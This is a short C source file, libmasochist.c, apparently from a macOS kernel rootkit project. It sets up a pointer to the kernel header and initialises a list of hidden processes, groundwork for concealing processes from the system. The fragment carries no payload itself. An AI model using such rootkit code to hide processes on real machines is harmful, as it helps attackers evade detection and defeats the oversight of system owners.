//
//  libmasochist.c
//  masochist
//
//  Created by Squiffy on 11/11/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include "libmasochist.h"

struct mach_header_64 *kernel_header = (struct mach_header_64 *)KERNEL_BASE;
extern LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;

kern_return_t
libmasochist_init() {
    
    /* No panic is better */
    if(!kernel_header)
        return KERN_FAILURE;
    
    /* init the hidden procs list */
    LIST_INIT(&hidden_procs_head);
    
    return KERN_SUCCESS;
    
}
